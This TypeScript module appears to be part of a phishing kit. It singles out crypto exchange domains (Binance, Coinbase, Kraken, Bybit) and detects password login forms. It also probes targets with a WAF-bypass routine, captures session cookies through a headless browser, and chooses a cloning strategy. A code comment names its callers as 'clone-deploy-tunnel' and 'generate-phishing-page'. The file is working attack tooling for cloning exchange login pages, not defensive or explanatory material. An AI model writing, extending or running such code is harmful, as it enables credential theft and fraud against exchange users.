/**
 * Mirror target resolution — CEX detection, login-form heuristics, WAF probe pipeline.
 */
import { captureMirrorWithHeadless } from './mirror-headless-capture.js'
import { isChallengeResponse, probeTargetWithWafBypass } from './mirror-waf-probe.js'

export const CEX_DOMAIN_MARKERS = ['binance', 'coinbase', 'kraken', 'bybit'] as const

export type MirrorTargetStrategy = 'mirror' | 'cex'

export type MirrorProbePipelineResult = {
  strategy: MirrorTargetStrategy
  probeOk: boolean
  html?: string
  cookies?: string
  cookiesPath?: string
  usedHeadless?: boolean
  challenge?: boolean
  detail?: string
}

export function isCexDomain(hostname: string): boolean {
  const host = hostname.toLowerCase().replace(/^www\./, '')
  return CEX_DOMAIN_MARKERS.some((m) => host.includes(m))
}

export function detectLoginForm(html: string): boolean {
  return /type\s*=\s*["']password["']/i.test(html)
}

export function shouldUseCexClone(
  target: URL,
  html?: string,
  opts?: { force?: boolean },
): boolean {
  if (opts?.force) return false
  if (isCexDomain(target.hostname)) return true
  if (html && detectLoginForm(html)) return true
  return false
}

export async function fetchTargetHomepageHtml(target: URL): Promise<string | undefined> {
  try {
    const res = await fetch(target.href, {
      headers: {
        Accept: 'text/html',
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      },
      signal: AbortSignal.timeout(25_000),
    })
    const body = await res.text()
    if (isChallengeResponse(res.status, body, res.headers)) return undefined
    return body
  } catch {
    return undefined
  }
}

/**
 * WAF probe → headless capture → cookie retry probe.
 * Used by clone-deploy-tunnel and generate-phishing-page.
 */
export async function runMirrorProbePipeline(
  target: URL,
  outDir: string,
  opts?: { force?: boolean; skipHeadless?: boolean; cookieHeader?: string },
): Promise<MirrorProbePipelineResult> {
  const probe = await probeTargetWithWafBypass(target, {
    cookieHeader: opts?.cookieHeader,
  })

  let html = probe.html
  let cookies = probe.cookies ?? opts?.cookieHeader
  let cookiesPath: string | undefined
  let usedHeadless = probe.usedHeadless

  if (!probe.ok && !opts?.skipHeadless && !probe.usedHeadless) {
    const captured = await captureMirrorWithHeadless(target.href, outDir)
    if (captured.ok) {
      usedHeadless = true
      html = captured.html
      cookies = captured.cookies
      cookiesPath = captured.cookiesPath

      const retry = await probeTargetWithWafBypass(target, {
        cookieHeader: cookies,
      })
      if (retry.ok && retry.html) {
        html = retry.html
      }
    }
  } else if (probe.usedHeadless && cookies) {
    cookiesPath = `${outDir}/mirror-session-cookies.txt`
  }

  const strategy = shouldUseCexClone(target, html, { force: opts?.force })
    ? 'cex'
    : 'mirror'

  return {
    strategy,
    probeOk: probe.ok || (html != null && html.length > 512 && !isChallengeResponse(200, html)),
    html,
    cookies,
    cookiesPath,
    usedHeadless,
    challenge: probe.challenge,
    detail: probe.detail,
  }
}
